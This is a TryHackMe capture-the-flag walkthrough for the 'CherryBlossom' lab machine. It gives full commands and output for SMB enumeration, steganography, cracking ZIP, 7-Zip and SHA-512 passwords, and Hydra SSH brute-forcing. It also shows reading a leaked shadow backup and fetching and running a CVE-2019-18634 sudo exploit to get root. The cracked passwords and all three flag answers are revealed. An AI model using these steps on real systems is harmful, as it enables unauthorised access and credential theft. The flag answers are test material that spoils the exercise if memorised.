# CherryBlossom — TryHackMe Walkthrough

> Boot-to-root with emphasis on crypto and password cracking.

<p align="center">
  <a href="https://ibb.co/1tXg6yS8"><img src="https://i.ibb.co/Jwp1Q6h5/75b3b7d3afdc8eb59a8cb3f51bd6f241.png" alt="75b3b7d3afdc8eb59a8cb3f51bd6f241" border="0"></a>
</p>

<p align="center">
  <a href="https://tryhackme.com/room/cherryblossom">
    <img src="https://img.shields.io/badge/TryHackMe-CherryBlossom-red?logo=tryhackme&logoColor=white">
  </a>
  <img src="https://img.shields.io/badge/Difficulty-Hard-red">
  <img src="https://img.shields.io/badge/Platform-Linux-black">
  <img src="https://img.shields.io/badge/Focus-SMB%20%7C%20Stego%20%7C%20Hash%20Cracking%20%7C%20CVE--2019--18634-blue">
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Network Enumeration |
| 2 | SMB Enumeration |
| 3 | Steganography |
| 4 | Brute Forcing — Zip Password |
| 5 | Brute Forcing — 7-Zip Hash |
| 6 | Brute Forcing — SSH |
| 7 | Brute Forcing — SHA-512 Unix Hash |
| 8 | CVE-2019-18634 — Sudo 1.8.25p `pwfeedback` Buffer Overflow |

---

## Learning Objectives

By the end of this walkthrough, you will be able to:

- Enumerate SMB shares and download files anonymously
- Decode Base64 data and identify file types from raw bytes
- Extract hidden files from images using steganography tools
- Fix a corrupted ZIP file by correcting its magic bytes with a hex editor
- Crack a password-protected ZIP using `fcrackzip`
- Crack a 7-Zip encrypted archive using John the Ripper
- Crack a SHA-512 Unix hash using Hashcat
- Exploit CVE-2019-18634 to escalate to root via a sudo buffer overflow

---

## Prerequisites

- Basic familiarity with Linux terminal commands
- Nmap, smbclient, John the Ripper, Hashcat, Hydra, and Netcat installed
- `fcrackzip`, `stegpy`, and a hex editor installed
- Target machine running on TryHackMe (replace `Machine_IP` with your assigned IP)

---

## Task 1 — Flags

---

### Step 1 — Network Enumeration

**Approach:** Run an aggressive Nmap scan to identify all open ports and services on the target.

```
kali@kali:~/CTFs/tryhackme/CherryBlossom$ sudo nmap -A -sS -sC -sV -O Machine_IP
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-18 15:52 CEST
Nmap scan report for Machine_IP
Host is up (0.037s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 21:ee:30:4f:f8:f7:9f:32:6e:42:95:f2:1a:1a:04:d3 (RSA)
|   256 dc:fc:de:d6:ec:43:61:00:54:9b:7c:40:1e:8f:52:c4 (ECDSA)
|_  256 12:81:25:6e:08:64:f6:ef:f5:0c:58:71:18:38:a5:c6 (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: UBUNTU; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: UBUNTU, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: cherryblossom
|   NetBIOS computer name: UBUNTU\x00
|_  System time: 2020-10-18T14:53:00+01:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.66 seconds
```

> **Note:** Three ports are open — **SSH on 22**, **NetBIOS on 139**, and **SMB on 445**. Samba is running on an Ubuntu machine. SMB message signing is disabled, which is flagged as dangerous. The computer name `cherryblossom` is also revealed. Next step is to enumerate the SMB shares to see what is accessible.

---

### Step 2 — SMB Share Enumeration

**Approach:** Use the Nmap `smb-enum-shares` script to list all available shares and check their access permissions without providing credentials.

```
kali@kali:~/CTFs/tryhackme/CherryBlossom$ sudo nmap --script smb-enum-shares -vv Machine_IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-18 15:54 CEST
Nmap scan report for Machine_IP
Not shown: 997 closed ports
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 63
139/tcp open  netbios-ssn  syn-ack ttl 63
445/tcp open  microsoft-ds syn-ack ttl 63

Host script results:
| smb-enum-shares:
|   account_used: <blank>
|   \\Machine_IP\Anonymous:
|     Type: STYPE_DISKTREE
|     Comment: Anonymous File Server Share
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\samba
|     Anonymous access: READ/WRITE
|   \\Machine_IP\IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (Samba 4.7.6-Ubuntu)
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|_    Anonymous access: READ/WRITE
```

> **Note:** An `Anonymous` share with **READ/WRITE** access is available with no credentials required. Connect to it with `smbclient //Machine_IP/Anonymous` and press Enter when prompted for a password. Inside you will find `journal.txt` — download it with `get journal.txt`.

---

### Step 3 — Decoding the SMB File

**Approach:** The `journal.txt` file contains Base64 encoded content. Decode it and check what type of file it produces.

```
kali@kali:~/CTFs/tryhackme/CherryBlossom$ cat journal.txt | base64 -d > output
kali@kali:~/CTFs/tryhackme/CherryBlossom$ file output
output: PNG image data, 1280 x 853, 8-bit/color RGB, non-interlaced
```

> **Note:** The Base64 content decodes to a **PNG image file**. Renaming or saving it with a `.png` extension allows it to be opened and viewed. However, the real content is hidden inside the image using steganography. Use `stegpy` to extract any hidden files embedded within it.

---

### Step 4 — Steganography Extraction and Zip Password Cracking

**Approach:** Run `stegpy` on the decoded PNG to extract any hidden files, then crack the password-protected ZIP that is found inside.

```
kali@kali:~/CTFs/tryhackme/CherryBlossom$ stegpy output
File _journal.zip succesfully extracted from output
kali@kali:~/CTFs/tryhackme/CherryBlossom$ unzip _journal.zip
Archive:  _journal.zip
file #1:  bad zipfile offset (local header sig):  0
kali@kali:~/CTFs/tryhackme/CherryBlossom$ file _journal.zip
_journal.zip: JPEG image data
```

> **Note:** The extracted file fails to unzip — `file` reports it as JPEG data even though it should be a ZIP. This is because the **magic bytes** (the first few bytes of the file that identify its format) have been corrupted or replaced. A valid ZIP file starts with the magic bytes `50 4B 03 04`. Open the file in a hex editor (`hexeditor _journal.zip`), navigate to the beginning of the file, and overwrite the first four bytes with `50 4B 03 04`. Save the corrected file as `_journal2.zip`.

```
kali@kali:~/CTFs/tryhackme/CherryBlossom$ fcrackzip -uDp /usr/share/wordlists/rockyou.txt _journal2.zip

PASSWORD FOUND!!!!: pw == september
```

> **Note:** `fcrackzip` with the `-u` (use unzip to verify), `-D` (dictionary attack), and `-p` (wordlist path) flags cracks the ZIP password as **`september`**. Extract the contents with `unzip -P september _journal2.zip`. Inside is a `Journal.ctz` file — a CryptoNote or similar encrypted file format that will require another cracking step.

---

### Step 5 — Cracking the 7-Zip Encrypted Archive

**Approach:** Extract the hash from the encrypted archive using `7z2john` and crack it with John the Ripper.

```
kali@kali:~/CTFs/tryhackme/CherryBlossom$ john --wordlist=/usr/share/wordlists/rockyou.txt Journal.hash
Using default input encoding: UTF-8
Loaded 1 password hash (7z, 7-Zip [SHA256 256/256 AVX2 8x AES])
Cost 1 (iteration count) is 524288 for all loaded hashes
Cost 2 (padding size) is 5 for all loaded hashes
Cost 3 (compression type) is 2 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tigerlily        (Journal.ctz)
1g 0:00:06:17 DONE (2020-10-18 16:17) 0.002645g/s 14.81p/s 14.81c/s 14.81C/s
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

> **Note:** John cracks the 7-Zip archive password as **`tigerlily`** after about 6 minutes. SHA-256 with 524,288 iterations (the 7-Zip key derivation) is deliberately slow — this is expected. Open the archive with the cracked password to reveal the journal contents, which contain the first flag.

The decrypted journal reads:

```
Found this lying around an old computer my boss gave me to analyse. Couldn't figure it out.
Leaving it here. Hopefully all will become clear when I break the encryption:

THM{054a8f1db7618f8f6a41a0b3349baa11}
```

---

### Question 1 — Journal Flag

<details>
<summary>Reveal Answer</summary>

**`THM{054a8f1db7618f8f6a41a0b3349baa11}`**

</details>

---

### Step 6 — Brute-Forcing SSH with Hydra

**Approach:** A custom wordlist `cherry-blossom.list` is found within the extracted journal contents. Use it with Hydra to brute-force SSH login for the user `lily`.

```
kali@kali:~/CTFs/tryhackme/CherryBlossom$ hydra -l lily -P cherry-blossom.list ssh://Machine_IP
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-18 16:20:53
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 9923 login tries (l:1/p:9923), ~621 tries per task
[DATA] attacking ssh://Machine_IP:22/
[STATUS] 180.00 tries/min, 180 tries in 00:01h, 9747 to do in 00:55h, 16 active
[22][ssh] host: Machine_IP   login: lily   password: Mr.$un$hin3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-18 16:26:38
```

> **Note:** Hydra cracks SSH credentials for `lily` as **`Mr.$un$hin3`**. The custom wordlist included with the room is far smaller than `rockyou.txt` (9,923 entries vs 14 million), which is why the crack completes relatively quickly. Log in via SSH and begin enumerating the system for escalation paths.

---

### Step 7 — Reading the Shadow Backup and Cracking johan's Hash

**Approach:** After logging in as `lily`, check `/var/backups/` for any readable backup files. A `shadow.bak` file contains password hashes for all users. Extract the hash for user `johan` and crack it with Hashcat.

```
lily@cherryblossom:/var/backups$ cat shadow.bak
root:$6$l81PobKw$DE0ra9mYvNY5rO0gzuJCCXF9p08BQ8ALp5clk/E6RwSxxrw97h2Ix9O6cpVHnq1ZUw3a/OCubATvANEv9Od9F1:18301:0:99999:7:::
...
johan:$6$zV7zbU1b$FomT/aM2UMXqNnqspi57K/hHBG8DkyACiV6ykYmxsZG.vLALyf7kjsqYjwW391j1bue2/.SVm91uno5DUX7ob0:18301:0:99999:7:::
lily:$6$3GPkY0ZP$6zlBpNWsBHgo6X5P7kI2JG6loUkZBIOtuOxjZpD71spVdgqM4CTXMFYVScHHTCDP0dG2rhDA8uC18/Vid3JCk0:18301:0:99999:7:::
...
```

> **Note:** `/var/backups/shadow.bak` is readable by `lily` — a serious misconfiguration. The `$6$` prefix identifies these as **SHA-512 Unix crypt** hashes (hashcat mode `-m 1800`). Extract `johan`'s hash to a file called `johan.hash` and crack it using the custom wordlist.

```
kali@kali:~/CTFs/tryhackme/CherryBlossom$ hashcat -m1800 -a0 --force johan.hash cherry-blossom.list
hashcat (v5.1.0) starting...

Hashes: 1 digests; 1 unique digests, 1 unique salts

$6$zV7zbU1b$FomT/aM2UMXqNnqspi57K/hHBG8DkyACiV6ykYmxsZG.vLALyf7kjsqYjwW391j1bue2/.SVm91uno5DUX7ob0:##scuffleboo##

Session..........: hashcat
Status...........: Cracked
Hash.Type........: sha512crypt $6$, SHA512 (Unix)
Hash.Target......: $6$zV7zbU1b$FomT/aM2...UX7ob0
Time.Started.....: Sun Oct 18 16:32:19 2020 (14 secs)
Time.Estimated...: Sun Oct 18 16:32:33 2020 (0 secs)
Speed.#1.........:      497 H/s (5.09ms) @ Accel:128 Loops:64 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 6912/9923 (69.66%)
```

> **Note:** Hashcat cracks `johan`'s SHA-512 hash in just 14 seconds using the custom wordlist. The password is **`##scuffleboo##`**. Switch to `johan` with `su - johan` and read `user.txt`.

---

### Step 8 — Reading the User Flag

```
lily@cherryblossom:/var/backups$ su - johan
Password:
johan@cherryblossom:~$ ls
user.txt
johan@cherryblossom:~$ cat user.txt
THM{cb064113d54e24dc84f26b1f63bf3098}
```

---

### Question 2 — User Flag

<details>
<summary>Reveal Answer</summary>

**`THM{cb064113d54e24dc84f26b1f63bf3098}`**

</details>

---

### Step 9 — Privilege Escalation via CVE-2019-18634

**Approach:** Check the sudo version on the machine. If it is version **1.8.25p** or earlier with `pwfeedback` enabled in `/etc/sudoers`, it is vulnerable to CVE-2019-18634 — a stack-based buffer overflow triggered by entering a very long password. Download the public exploit, compile it on the attack machine, and transfer it to the target.

```
kali@kali:~/CTFs/tryhackme/CherryBlossom$ wget https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/master/exploit.c
--2020-10-18 16:36:24--  https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/master/exploit.c
HTTP request sent, awaiting response... 200 OK
Length: 6311 (6.2K) [text/plain]
Saving to: 'exploit.c'

exploit.c               100%[==============================>]   6.16K  --.-KB/s    in 0s

2020-10-18 16:36:24 (15.2 MB/s) - 'exploit.c' saved [6311/6311]

kali@kali:~/CTFs/tryhackme/CherryBlossom$ gcc -o exploit exploit.c
kali@kali:~/CTFs/tryhackme/CherryBlossom$ scp exploit lily@Machine_IP:/tmp
lily@Machine_IP's password:
exploit                                                      100%   17KB 219.7KB/s   00:00
```

> **Note:** The exploit is compiled locally with `gcc` and transferred to the target via `scp`. It must be compiled on a machine with a compatible architecture — compiling on your Kali attack machine and transferring the binary works here because both machines are x86-64 Linux. The exploit works by triggering the `pwfeedback` buffer overflow in sudo to overwrite the stack and spawn a root shell.

---

### Step 10 — Running the Exploit and Reading root.txt

**Approach:** Switch to `johan`, navigate to `/tmp`, and execute the compiled exploit.

```
johan@cherryblossom:/tmp$ ls
exploit
johan@cherryblossom:/tmp$ ./exploit
[sudo] password for johan:
Sorry, try again.
# whoami
root
# cat /root/root.txt
THM{d4b5e228a567288d12e301f2f0bf5be0}
```

> **Note:** The exploit outputs `Sorry, try again.` — this is part of the buffer overflow process, not a real failure. Immediately after, a root shell `#` prompt appears. The `whoami` command confirms we are running as `root`. The root flag is read directly from `/root/root.txt`.

---

### Question 3 — Root Flag

<details>
<summary>Reveal Answer</summary>

**`THM{d4b5e228a567288d12e301f2f0bf5be0}`**

</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Nmap scan | Found SSH (22), SMB (139/445) on Ubuntu |
| 2 | SMB `smb-enum-shares` script | Found `Anonymous` share with READ/WRITE access |
| 3 | Downloaded `journal.txt` from SMB | Base64 encoded PNG image |
| 4 | Base64 decode + `stegpy` extraction | Extracted `_journal.zip` hidden inside the PNG |
| 5 | Hex editor fix of magic bytes | Corrected corrupted ZIP header from JPEG to `50 4B 03 04` |
| 6 | `fcrackzip` dictionary attack | Cracked ZIP password → `september` |
| 7 | John the Ripper on 7-Zip hash | Cracked archive password → `tigerlily`, revealed journal flag |
| 8 | Hydra SSH brute-force | Cracked `lily:Mr.$un$hin3` using custom wordlist |
| 9 | Read `/var/backups/shadow.bak` | Extracted `johan`'s SHA-512 hash |
| 10 | Hashcat `-m1800` dictionary attack | Cracked `johan`'s hash → `##scuffleboo##` |
| 11 | `su - johan` → read `user.txt` | Found user flag |
| 12 | CVE-2019-18634 exploit (sudo pwfeedback) | Gained root shell, read `root.txt` |
